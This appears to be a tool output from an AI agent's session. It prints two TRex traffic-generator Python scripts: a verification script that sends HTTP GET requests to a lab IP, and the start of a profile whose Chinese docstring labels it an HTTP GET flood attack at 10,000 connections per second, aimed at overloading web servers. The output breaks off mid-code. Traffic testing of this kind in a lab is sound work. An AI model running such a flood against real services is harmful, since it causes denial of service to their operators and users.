    content: {"success": true, "mode": "live", "returncode": 0, "stdout": "======================================================================\nFILE: astf_verify_get.py\nimport time\nimport sys\n\ndef p(*a):\n    print(*a)\n    sys.stdout.flush()\n\np(\"STEP: import trex\")\nfrom trex.astf.api import *\nfrom trex_common import make_astf_client, prepare_port\np(\"STEP: imports done\")\n\nTARGET_IP = \"100.1.11.3\"\nTARGET_PORT = 8081\nIMG_PATH = \"/api/activities/00000000-0000-0000-0000-000000000001/image\"\n\nhttp_req = (\n    \"GET %s HTTP/1.1\\r\\n\"\n    \"Host: %s:%d\\r\\n\"\n    \"User-Agent: Mozilla/5.0\\r\\n\"\n    \"Accept: */*\\r\\n\"\n    \"Connection: close\\r\\n\\r\\n\"\n    % (IMG_PATH, TARGET_IP, TARGET_PORT)\n).encode()\n\n\nclass Prof(object):\n    def get_profile(self):\n        dc = ASTFIPGenDist(ip_range=[\"100.1.11.200\", \"100.1.11.209\"], distribution=\"seq\")\n        ds = ASTFIPGenDist(ip_range=[TARGET_IP, TARGET_IP], distribution=\"seq\")\n        ipg = ASTFIPGen(glob=ASTFIPGenGlobal(ip_offset=\"0.0.0.0\"),\n                        dist_client=dc, dist_server=ds)\n\n        c = ASTFProgram()\n        c.connect()\n        c.send(http_req)\n        c.recv(1, clear=True)\n        c.reset()\n\n        s = ASTFProgram(side=\"s\")\n        s.recv(len(http_req))\n        s.reset()\n\n        tpl = ASTFTemplate(\n            client_template=ASTFTCPClientTemplate(ip_gen=ipg, program=c, port=TARGET_PORT),\n            server_template=ASTFTCPServerTemplate(program=s))\n        return ASTFProfile(default_ip_gen=ipg, templates=[tpl])\n\n\nc = None\ntry:\n    p(\"STEP: make client\")\n    c = make_astf_client()\n    p(\"STEP: acquire\")\n    c.acquire(force=True)\n    p(\"STEP: reset\")\n    c.reset()\n    p(\"STEP: prepare_port\")\n    prepare_port(c)\n    p(\"STEP: load_profile\")\n    c.load_profile(Prof().get_profile())\n    p(\"STEP: start\")\n    c.start(mult=1, duration=3, nc=False, block=False)\n    p(\"STEP: started\")\n    for i in range(6):\n        time.sleep(0.5)\n        try:\n            st = c.get_stats()\n            p(\"T%d global=%s\" % (i, st['global']))\n        except Exception as e:\n            p(\"stats err:\", repr(e))\n    p(\"STEP: stop\")\n    c.stop(block=True)\n    p(\"STEP: stopped\")\n    st = c.get_stats()\n    p(\"FINAL global=%s\" % (st['global'],))\nexcept Exception as e:\n    import traceback\n    p(\"EXCEPTION:\", repr(e))\n    traceback.print_exc()\n    sys.stdout.flush()\nfinally:\n    if c is not None:\n        try:\n            c.stop(block=False)\n        except Exception as e:\n            p(\"final stop err\", repr(e))\n        try:\n            c.disconnect(stop_traffic=False, release_ports=True)\n        except Exception as e:\n            p(\"disconnect err\", repr(e))\n    p(\"DONE\")\n\n======================================================================\nFILE: cat_astf_http_get_flood.py\n\"\"\"\n攻击名称: HTTP GET 洪泛（ASTF L7）\n攻击类别: 状态型 / 应用层\n攻击机制: 基于 ASTF 建立真实 TCP 连接并发送合法 HTTP GET 请求（可带 Host 头），\n          在应用层高频请求目标 URL，令目标 Web 服务器/后端 CGI/数据库承担高负载。\n          与 STL 裸包相比，ASTF 会真正解析响应，属于仿真度更高的 L7 压测/攻击。\n关键参数: dst_ip=目标 IP（默认 10.0.0.1）\n          dport=目标端口（默认 80）\n          url=请求路径（默认 /）\n          host=Host 头（默认 10.0.0.1）\n          cps=每秒新建连接数（默认 10000）\n          duration=持续时间秒（默认 30）\n预期效果: Web 服务 CPU/内存飙升、后端排队、响应时间(RTT)大幅升高、可能触发限流。\n\"\"\"\n\nfrom trex_astf_lib.api import *\n\n\nclass HttpGetProfile(ASTFProfile):\n    \"\"\"简单 HTTP GET 客户端：建连 -> 发送请求 -> 等待响应 -> 关闭。\"\"\"\n\n    def __init__(self, dst_ip, dport, host, url):\n        super(HttpGetProfile, self).__init__()\n        self.dst_ip = dst_ip\n        self.dport = dport\n        self.host = host\n        self.url = url\n\n    def create_conn(self, ip_gen, c):\n        c.connect()\n        req = (\"GET %s HTTP/1.1\\r\\nHost: %s\\r\\n\"\n               \"User-Agent: trex-astf\\r\\nConnection: close\\r\\n\\r\\n\"\n               % (self.url, self.host))\n        c.send(req)\n        c.recv(2048)       